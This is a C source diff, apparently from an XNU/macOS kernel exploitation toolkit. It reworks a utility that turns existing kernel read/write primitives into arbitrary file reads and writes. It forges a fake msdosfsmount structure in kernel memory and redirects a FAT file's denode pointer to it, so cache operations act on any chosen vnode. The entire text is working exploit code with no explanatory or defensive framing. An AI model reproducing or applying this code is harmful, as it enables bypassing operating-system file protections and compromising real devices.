@@ -27,6 +27,7 @@ struct xe_util_vnode {
     xe_util_msdosfs_t msdosfs_util;
     int cctl_fd;
     uintptr_t msdosfs_mount;
+    uintptr_t cctl_denode;
 };
 
 
@@ -38,24 +39,32 @@ xe_util_vnode_t xe_util_vnode_create(void) {
     char mount_point[PATH_MAX];
     xe_util_msdosfs_get_mountpoint(msdosfs_util, mount_point, sizeof(mount_point));
     
+    uintptr_t proc = xe_xnu_proc_current_proc();
+    
+    int mount_fd = xe_util_msdosfs_get_mount_fd(msdosfs_util);
+    uintptr_t mount_vnode;
+    error = xe_xnu_proc_find_fd_data(proc, mount_fd, &mount_vnode);
+    xe_assert_err(error);
+    uintptr_t mount = xe_kmem_read_ptr(mount_vnode, TYPE_VNODE_MEM_VN_UN_OFFSET);
+    uintptr_t msdosfs_mount = xe_kmem_read_ptr(mount, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
+    
     char buffer[PATH_MAX];
     snprintf(buffer, sizeof(buffer), "%s/data1", mount_point);
     int cctl_fd = open(buffer, O_RDONLY);
     xe_assert(cctl_fd >= 0);
     int res = fcntl(cctl_fd, F_NOCACHE);
     xe_assert_cond(res, ==, 0);
-    
-    int mount_fd = xe_util_msdosfs_get_mount_fd(msdosfs_util);
-    uintptr_t mount_vnode;
-    error = xe_xnu_proc_find_fd_data(xe_xnu_proc_current_proc(), mount_fd, &mount_vnode);
+    uintptr_t cctl_vnode;
+    error = xe_xnu_proc_find_fd_data(proc, cctl_fd, &cctl_vnode);
     xe_assert_err(error);
-    uintptr_t mount = xe_kmem_read_ptr(mount_vnode, TYPE_VNODE_MEM_VN_UN_OFFSET);
-    uintptr_t msdosfs_mount = xe_kmem_read_ptr(mount, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
+    uintptr_t cctl_dep = xe_kmem_read_ptr(cctl_vnode, TYPE_VNODE_MEM_VN_DATA_OFFSET);
+    xe_assert_cond(xe_kmem_read_uint64(cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET), ==, msdosfs_mount);
     
     xe_util_vnode_t util = malloc(sizeof(struct xe_util_vnode));
     util->msdosfs_util = msdosfs_util;
     util->cctl_fd = cctl_fd;
     util->msdosfs_mount = msdosfs_mount;
+    util->cctl_denode = cctl_dep;
     
     return util;
 }
@@ -83,7 +92,10 @@ void xe_util_vnode_populate_cache(xe_util_vnode_t util) {
 void xe_util_vnode_read(xe_util_vnode_t util, uintptr_t vnode, char* dst, size_t size) {
     xe_assert_cond(size, <=, UINT32_MAX);
     uintptr_t temp_mem;
-    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
+    xe_allocator_small_mem_t temp_mem_allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
+    
+    uintptr_t fake_msdosfs;
+    xe_allocator_small_mem_t fake_msdosfs_allocator = xe_allocator_small_mem_allocate(TYPE_MSDOSFSMOUNT_SIZE, &fake_msdosfs);
     
     char mount[TYPE_MSDOSFSMOUNT_SIZE];
     xe_kmem_read(mount, util->msdosfs_mount, 0, sizeof(mount));
@@ -100,21 +112,23 @@ void xe_util_vnode_read(xe_util_vnode_t util, uintptr_t vnode, char* dst, size_t
     *pm_fatmult = 0;
     *pm_fat_active_vp = vnode;
     
-    char backup[TYPE_MSDOSFSMOUNT_SIZE];
-    xe_kmem_read(backup, util->msdosfs_mount, 0, sizeof(backup));
-    
-    xe_kmem_write(util->msdosfs_mount, 0, mount, sizeof(mount));
+    xe_kmem_write(fake_msdosfs, 0, mount, sizeof(mount));
+    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, fake_msdosfs);
     xe_util_vnode_populate_cache(util);
-    xe_kmem_write(util->msdosfs_mount, 0, backup, sizeof(backup));
+    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
     
     xe_kmem_read(dst, temp_mem, 0, size);
-    xe_allocator_small_mem_destroy(&allocator);
+    xe_allocator_small_mem_destroy(&temp_mem_allocator);
+    xe_allocator_small_mem_destroy(&fake_msdosfs_allocator);
 }
 
 void xe_util_vnode_write(xe_util_vnode_t util, uintptr_t vnode, const char* src, size_t size) {
     uintptr_t temp_mem;
-    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
+    xe_allocator_small_mem_t temp_mem_allocator = xe_allocator_small_mem_allocate(size, &temp_mem);
     xe_kmem_write(temp_mem, 0, (void*)src, size);
+    
+    uintptr_t fake_msdosfs;
+    xe_allocator_small_mem_t fake_msdosfs_allocator = xe_allocator_small_mem_allocate(TYPE_MSDOSFSMOUNT_SIZE, &fake_msdosfs);
     
     char mount[TYPE_MSDOSFSMOUNT_SIZE];
     xe_kmem_read(mount, util->msdosfs_mount, 0, sizeof(mount));
@@ -135,18 +149,18 @@ void xe_util_vnode_write(xe_util_vnode_t util, uintptr_t vnode, const char* src,
     *pm_fat_flags = 1; // mark fat cache dirty
     *pm_sync_timer = 0;
     
-    char backup[TYPE_MSDOSFSMOUNT_SIZE];
-    xe_kmem_read(backup, util->msdosfs_mount, 0, sizeof(backup));
-    
-    xe_kmem_write(util->msdosfs_mount, 0, mount, sizeof(mount));
+    xe_kmem_write(fake_msdosfs, 0, mount, sizeof(mount));
+    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, fake_msdosfs);
     xe_util_vnode_flush_cache(util);
+    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
     
-    xe_kmem_write(util->msdosfs_mount, 0, backup, sizeof(backup));
-    xe_allocator_small_mem_destroy(&allocator);
+    xe_allocator_small_mem_destroy(&temp_mem_allocator);
+    xe_allocator_small_mem_destroy(&fake_msdosfs_allocator);
 }
 
 void xe_util_vnode_destroy(xe_util_vnode_t* util_p) {
     xe_util_vnode_t util = *util_p;
+    xe_kmem_write_uint64(util->cctl_denode, TYPE_DENODE_MEM_DE_PMP_OFFSET, util->msdosfs_mount);
     close(util->cctl_fd);
     xe_util_msdosfs_unmount(&util->msdosfs_util);
     free(util);
